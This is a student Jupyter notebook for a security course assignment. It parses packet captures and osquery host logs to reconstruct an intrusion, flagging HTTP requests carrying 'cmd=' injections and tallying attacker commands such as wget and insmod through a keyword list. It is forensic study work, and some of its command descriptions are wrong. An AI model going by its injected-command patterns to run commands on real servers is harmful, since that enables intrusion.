{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# MP3: ECE 498 (4-credit hours) \n",
    "# Team members: \n",
    "## Akhilesh Somani (somani4)\n",
    "## Gowtham Kuntumalla (gowtham4)\n",
    "## Manan Mehta (mananm2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import numpy as np\n",
    "import pyshark\n",
    "from pandas.io.json import json_normalize\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "http = pyshark.FileCapture('data\\http.pcap', keep_packets = True)\n",
    "http2 = pyshark.FileCapture('data\\http2.pcap', keep_packets = True)\n",
    "dns = pyshark.FileCapture('data\\dns.pcap', keep_packets = True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# TASK 0.2: Process pcap files into Pandas Dataframe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# HTTP Dataframe formation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "ETH = 0\n",
    "IP = 1\n",
    "TCP = 2\n",
    "http_list = []\n",
    "ctr = 0\n",
    "for pkt in http:\n",
    "    pkt_time_stamp = pkt.sniff_time.timestamp()\n",
    "    pkt_length = len(pkt)\n",
    "    pkt_highest_layer = pkt.highest_layer \n",
    "    try: \n",
    "        ip_src = pkt[IP].src\n",
    "        port_src = pkt[TCP].srcport\n",
    "        ip_dst = pkt[IP].dst\n",
    "        port_dst = pkt[TCP].dstport\n",
    "    except:\n",
    "        ip_src = \"none\"\n",
    "        port_src = \"none\"\n",
    "        ip_dst = \"none\"\n",
    "        port_dst = \"none\"\n",
    "        \n",
    "    chat = \"none\"\n",
    "    server = \"none\"\n",
    "    \n",
    "    try:\n",
    "        chat = pkt.http.chat \n",
    "        server = pkt.http.server\n",
    "    except:\n",
    "        None\n",
    "    try:\n",
    "        request = pkt.http.request_URI\n",
    "    except:\n",
    "        request = \"none\"\n",
    "    \n",
    "    try:\n",
    "        content = pkt.http.content_type\n",
    "    except:\n",
    "        content = \"\"\n",
    "                \n",
    "    d = {'timestamp':pkt_time_stamp,'length':pkt_length,'highest_layer':pkt_highest_layer,'ip_src':ip_src,'ip_dst':ip_dst,\\\n",
    "         'port_src':port_src,  'port_dst':port_dst, 'server': server, 'chat': str(chat).rstrip('\\\\r\\\\n'), 'request_uri' : request,\\\n",
    "        'content_type' : content, 'content_length':len(content)}\n",
    "       \n",
    "    http_list.append(d)\n",
    "    ctr+=1\n",
    "\n",
    "http_df = pd.DataFrame(http_list)\n",
    "http_df.to_csv(\"data\\http_df.csv\", sep='\\t')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>length</th>\n",
       "      <th>highest_layer</th>\n",
       "      <th>ip_src</th>\n",
       "      <th>ip_dst</th>\n",
       "      <th>port_src</th>\n",
       "      <th>port_dst</th>\n",
       "      <th>server</th>\n",
       "      <th>chat</th>\n",
       "      <th>request_uri</th>\n",
       "      <th>content_type</th>\n",
       "      <th>content_length</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>58</td>\n",
       "      <td>TCP</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>55952</td>\n",
       "      <td>8080</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td></td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>58</td>\n",
       "      <td>TCP</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>8080</td>\n",
       "      <td>55952</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td></td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>54</td>\n",
       "      <td>TCP</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>55952</td>\n",
       "      <td>8080</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td></td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>766</td>\n",
       "      <td>HTTP</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>55952</td>\n",
       "      <td>8080</td>\n",
       "      <td>none</td>\n",
       "      <td>GET /j HTTP/1.1</td>\n",
       "      <td>/j</td>\n",
       "      <td></td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>54</td>\n",
       "      <td>TCP</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>8080</td>\n",
       "      <td>55952</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td></td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp  length highest_layer      ip_src      ip_dst port_src  \\\n",
       "0  1.521395e+09      58           TCP    10.0.2.2  172.17.0.2    55952   \n",
       "1  1.521395e+09      58           TCP  172.17.0.2    10.0.2.2     8080   \n",
       "2  1.521395e+09      54           TCP    10.0.2.2  172.17.0.2    55952   \n",
       "3  1.521395e+09     766          HTTP    10.0.2.2  172.17.0.2    55952   \n",
       "4  1.521395e+09      54           TCP  172.17.0.2    10.0.2.2     8080   \n",
       "\n",
       "  port_dst server             chat request_uri content_type  content_length  \n",
       "0     8080   none             none        none                            0  \n",
       "1    55952   none             none        none                            0  \n",
       "2     8080   none             none        none                            0  \n",
       "3     8080   none  GET /j HTTP/1.1          /j                            0  \n",
       "4    55952   none             none        none                            0  "
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# pd.set_option('display.max_rows', http_df.shape[0]+1)   #  http_df.shape[0]+1\n",
    "http_df.head(5)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# HTTP 2 Dataframe formation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "ETH = 0\n",
    "IP = 1\n",
    "TCP = 2\n",
    "http2_list = []\n",
    "ctr = 0\n",
    "for pkt in http2:\n",
    "    pkt_time_stamp = pkt.sniff_time.timestamp()\n",
    "    pkt_length = len(pkt)\n",
    "    pkt_highest_layer = pkt.highest_layer \n",
    "    try: \n",
    "        ip_src = pkt[IP].src\n",
    "        port_src = pkt[TCP].srcport\n",
    "        ip_dst = pkt[IP].dst\n",
    "        port_dst = pkt[TCP].dstport\n",
    "    except:\n",
    "        ip_src = \"none\"\n",
    "        port_src = \"none\"\n",
    "        ip_dst = \"none\"\n",
    "        port_dst = \"none\"\n",
    "        \n",
    "                \n",
    "    d = {'timestamp':pkt_time_stamp,'length':pkt_length,'highest_layer':pkt_highest_layer,'ip_src':ip_src,'ip_dst':ip_dst,\\\n",
    "         'port_src':port_src,  'port_dst':port_dst}\n",
    "       \n",
    "    http2_list.append(d)\n",
    "    ctr+=1\n",
    "\n",
    "http2_df = pd.DataFrame(http2_list)\n",
    "http2_df.to_csv(\"data\\http2_df.csv\", sep='\\t')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>length</th>\n",
       "      <th>highest_layer</th>\n",
       "      <th>ip_src</th>\n",
       "      <th>ip_dst</th>\n",
       "      <th>port_src</th>\n",
       "      <th>port_dst</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>55</td>\n",
       "      <td>TLS</td>\n",
       "      <td>10.194.59.155</td>\n",
       "      <td>74.125.124.95</td>\n",
       "      <td>61103</td>\n",
       "      <td>443</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>66</td>\n",
       "      <td>TCP</td>\n",
       "      <td>74.125.124.95</td>\n",
       "      <td>10.194.59.155</td>\n",
       "      <td>443</td>\n",
       "      <td>61103</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>55</td>\n",
       "      <td>TLS</td>\n",
       "      <td>10.194.59.155</td>\n",
       "      <td>104.25.218.21</td>\n",
       "      <td>64299</td>\n",
       "      <td>443</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.553740e+09</td>\n",
       "      <td>66</td>\n",
       "      <td>TCP</td>\n",
       "      <td>104.25.218.21</td>\n",
       "      <td>10.194.59.155</td>\n",
       "      <td>443</td>\n",
       "      <td>64299</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp  length highest_layer         ip_src         ip_dst port_src  \\\n",
       "0  1.553740e+09      55           TLS  10.194.59.155  74.125.124.95    61103   \n",
       "1  1.553740e+09      66           TCP  74.125.124.95  10.194.59.155      443   \n",
       "2  1.553740e+09      55           TLS  10.194.59.155  104.25.218.21    64299   \n",
       "3  1.553740e+09      66           TCP  104.25.218.21  10.194.59.155      443   \n",
       "\n",
       "  port_dst  \n",
       "0      443  \n",
       "1    61103  \n",
       "2      443  \n",
       "3    64299  "
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "http2_df.head(4)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# DNS Dataframe Formation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "ETH = 0\n",
    "IP = 1\n",
    "TCP = 2\n",
    "dns_list = []\n",
    "ctr = 0\n",
    "for pkt in dns:\n",
    "    if pkt[2].layer_name !='udp':\n",
    "        continue\n",
    "        \n",
    "    pkt_time_stamp = pkt.sniff_time.timestamp()\n",
    "    pkt_length = int(pkt.udp.length)\n",
    "    pkt_highest_layer = pkt.highest_layer \n",
    "    ip_src = pkt.ip.src\n",
    "    ip_dst  = pkt.ip.dst\n",
    "    port_src = pkt.udp.srcport\n",
    "    port_dst = pkt.udp.dstport\n",
    "            \n",
    "    d = {'timestamp': pkt_time_stamp, 'query_length':pkt_length, 'highest_layer':pkt_highest_layer, 'ip_src':ip_src, 'ip_dst':ip_dst,\\\n",
    "         'port_src':port_src, 'port_dst': port_dst}\n",
    "       \n",
    "    dns_list.append(d)\n",
    "    ctr+=1\n",
    "\n",
    "dns_df = pd.DataFrame(dns_list)\n",
    "dns_df.to_csv(\"data\\dns_df.csv\", sep='\\t')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>query_length</th>\n",
       "      <th>highest_layer</th>\n",
       "      <th>ip_src</th>\n",
       "      <th>ip_dst</th>\n",
       "      <th>port_src</th>\n",
       "      <th>port_dst</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>54</td>\n",
       "      <td>DNS</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>43204</td>\n",
       "      <td>53</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>59</td>\n",
       "      <td>DNS</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>53</td>\n",
       "      <td>43204</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>54</td>\n",
       "      <td>DNS</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>43204</td>\n",
       "      <td>53</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>59</td>\n",
       "      <td>DNS</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>53</td>\n",
       "      <td>43204</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>54</td>\n",
       "      <td>DNS</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>43204</td>\n",
       "      <td>53</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp  query_length highest_layer           ip_src           ip_dst  \\\n",
       "0  1.521397e+09            54           DNS        10.0.2.15  162.212.156.148   \n",
       "1  1.521397e+09            59           DNS  162.212.156.148        10.0.2.15   \n",
       "2  1.521397e+09            54           DNS        10.0.2.15  162.212.156.148   \n",
       "3  1.521397e+09            59           DNS  162.212.156.148        10.0.2.15   \n",
       "4  1.521397e+09            54           DNS        10.0.2.15  162.212.156.148   \n",
       "\n",
       "  port_src port_dst  \n",
       "0    43204       53  \n",
       "1       53    43204  \n",
       "2    43204       53  \n",
       "3       53    43204  \n",
       "4    43204       53  "
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dns_df.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 0.3: Process Operating System Query logs into Pandas Dataframe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "with open ('data\\osqueryd.results.log','r') as file:\n",
    "    lines = file.readlines()\n",
    "\n",
    "lines = [eval(line) for line in lines]\n",
    "osquery_df = pd.json_normalize(lines)\n",
    "osquery_df.to_csv('data\\oslogs.csv', sep = '\\t')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 0.5: Identifying correct dataset to work with"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of 'cmd=' found in HTTP are 7\n",
      "HTTP is the attacker dataset\n"
     ]
    }
   ],
   "source": [
    "i = 0 # Gives the index of the cmd content file\n",
    "ctr=0 # Counts the number of \"cmd =\" contents\n",
    "for pkt in http:\n",
    "    if len(pkt.layers)<=3:\n",
    "        continue\n",
    "        \n",
    "    try:\n",
    "        if \"cmd=\" in pkt.http.content_type:\n",
    "            ctr+=1 \n",
    "    except:\n",
    "        None\n",
    "    \n",
    "print(\"Number of 'cmd=' found in HTTP are\", ctr)\n",
    "if ctr > 0:\n",
    "    print(\"HTTP is the attacker dataset\")\n",
    "else:\n",
    "    print(\"HTTP is the legitimate dataset\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of 'cmd=' found in HTTP are 0\n",
      "HTTP2 is the legitimate dataset\n"
     ]
    }
   ],
   "source": [
    "ctr=0 # Counts the number of \"cmd =\" contents\n",
    "\n",
    "for pkt in http2:\n",
    "    if len(pkt.layers)<=3:\n",
    "        continue\n",
    "        \n",
    "    try:\n",
    "        if \"cmd=\" in pkt.http2.content_type:\n",
    "            ctr+=1 \n",
    "    except:\n",
    "        None\n",
    "    \n",
    "#print(\"\\n\\n\")\n",
    "print(\"Number of 'cmd=' found in HTTP are\", ctr)\n",
    "if ctr > 0:\n",
    "    print(\"HTTP2 is the attacker dataset\")\n",
    "else:\n",
    "    print(\"HTTP2 is the legitimate dataset\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 0.6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## HTTP2 is a legitimate datset. So, we will work with HTTP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 1 HTTP Traffic Analysis (Attack Stages 1-2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "# Task 1.1 (a), (b), (c)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Timestamp of first attempted scan is 1521394903.610774\n",
      "IP Address of vulnerable server is 172.17.0.2\n",
      "Port of vulnerable server is 8080\n",
      "\n",
      "\n",
      "IP Address of attacker server is 10.0.2.2\n",
      "Port of attacker server is 55952\n"
     ]
    }
   ],
   "source": [
    "bool_array = (http_df['request_uri'] == '/showcase.action')      # & (http_df['server'] == 'Apache-Coyote/1.1')\n",
    "print(\"Timestamp of first attempted scan is\", (http_df['timestamp'].loc[bool_array]).iloc[0])\n",
    "print(\"IP Address of vulnerable server is\", (http_df['ip_dst'].loc[bool_array]).iloc[0])\n",
    "print(\"Port of vulnerable server is\", (http_df['port_dst'].loc[bool_array]).iloc[0])\n",
    "print(\"\\n\")\n",
    "print(\"IP Address of attacker server is\", (http_df['ip_src'].loc[bool_array]).iloc[0])\n",
    "print(\"Port of attacker server is\", (http_df['port_src'].loc[bool_array]).iloc[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 1.2 (a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>length</th>\n",
       "      <th>highest_layer</th>\n",
       "      <th>ip_src</th>\n",
       "      <th>ip_dst</th>\n",
       "      <th>port_src</th>\n",
       "      <th>port_dst</th>\n",
       "      <th>server</th>\n",
       "      <th>chat</th>\n",
       "      <th>request_uri</th>\n",
       "      <th>content_type</th>\n",
       "      <th>content_length</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>58</td>\n",
       "      <td>TCP</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>55952</td>\n",
       "      <td>8080</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td></td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.521395e+09</td>\n",
       "      <td>58</td>\n",
       "      <td>TCP</td>\n",
       "      <td>172.17.0.2</td>\n",
       "      <td>10.0.2.2</td>\n",
       "      <td>8080</td>\n",
       "      <td>55952</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td></td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp  length highest_layer      ip_src      ip_dst port_src  \\\n",
       "0  1.521395e+09      58           TCP    10.0.2.2  172.17.0.2    55952   \n",
       "1  1.521395e+09      58           TCP  172.17.0.2    10.0.2.2     8080   \n",
       "\n",
       "  port_dst server  chat request_uri content_type  content_length  \n",
       "0     8080   none  none        none                            0  \n",
       "1    55952   none  none        none                            0  "
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "http_df.head(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "bool_array = http_df['content_length'] > 0\n",
    "content_type_df = http_df[['timestamp','content_type', 'content_length']].loc[bool_array]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 1.2 (b)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Command: whoami is present 1 time(s).\n",
      "Command: wget is present 2 time(s).\n",
      "Command: ls is present 7 time(s).\n",
      "Command: cat is present 4 time(s).\n",
      "Command: cd is present 0 time(s).\n",
      "Command: insmod is present 3 time(s).\n",
      "Command: ssh is present 0 time(s).\n",
      "Command: lsmod is present 0 time(s).\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Command_Name</th>\n",
       "      <th>Present</th>\n",
       "      <th>Intrepretation</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>whoami</td>\n",
       "      <td>1</td>\n",
       "      <td>displays the name of the current user</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>wget</td>\n",
       "      <td>2</td>\n",
       "      <td>retrieves content from web servers</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>ls</td>\n",
       "      <td>7</td>\n",
       "      <td>list computer files</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>cat</td>\n",
       "      <td>4</td>\n",
       "      <td>reads files sequentially, writing them to stan...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>cd</td>\n",
       "      <td>0</td>\n",
       "      <td>change directory</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>insmod</td>\n",
       "      <td>3</td>\n",
       "      <td>insert module</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>ssh</td>\n",
       "      <td>0</td>\n",
       "      <td>centralize access controls across infrastructu...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>lsmod</td>\n",
       "      <td>0</td>\n",
       "      <td>shows which loadable kernel modules are curren...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "  Command_Name  Present                                     Intrepretation\n",
       "0       whoami        1              displays the name of the current user\n",
       "1         wget        2                 retrieves content from web servers\n",
       "2           ls        7                                list computer files\n",
       "3          cat        4  reads files sequentially, writing them to stan...\n",
       "4           cd        0                                   change directory\n",
       "5       insmod        3                                      insert module\n",
       "6          ssh        0  centralize access controls across infrastructu...\n",
       "7        lsmod        0  shows which loadable kernel modules are curren..."
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "command_names = ['whoami', 'wget', 'ls', 'cat', 'cd', 'insmod', 'ssh','lsmod']\n",
    "ctr = [0]*len(command_names)\n",
    "for i in range(len(command_names)):\n",
    "    ctr[i] = np.sum(content_type_df['content_type'].str.contains(command_names[i]))\n",
    "    print(\"Command: \" + command_names[i] + \" is present \" + str(ctr[i]) + \" time(s).\")\n",
    "\n",
    "d = {\"Command_Name\":command_names,\\\n",
    "    \"Present\": ctr,\\\n",
    "    \" Intrepretation\": [\"displays the name of the current user\", \"retrieves content from web servers\",\\\n",
    "                        \"list computer files\", \\\n",
    "                        \"reads files sequentially, writing them to standard output\",\\\n",
    "                        \"change directory\", \"insert module\", \"centralize access controls across infrastructure resources\",\\\n",
    "                        \"shows which loadable kernel modules are currently loaded\"]}\n",
    "pd.DataFrame(d)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 1 Host Logs Analysis (Attack Stages 3-5)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## (1) Analyze kernel-related activities"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>...</th>\n",
       "      <th>columns.md5</th>\n",
       "      <th>columns.mode</th>\n",
       "      <th>columns.mtime</th>\n",
       "      <th>columns.sha1</th>\n",
       "      <th>columns.sha256</th>\n",
       "      <th>columns.size</th>\n",
       "      <th>columns.target_path</th>\n",
       "      <th>columns.time</th>\n",
       "      <th>columns.transaction_id</th>\n",
       "      <th>columns.uid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>system_info</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:05 2018 UTC</td>\n",
       "      <td>1517877185</td>\n",
       "      <td>0</td>\n",
       "      <td>38463</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
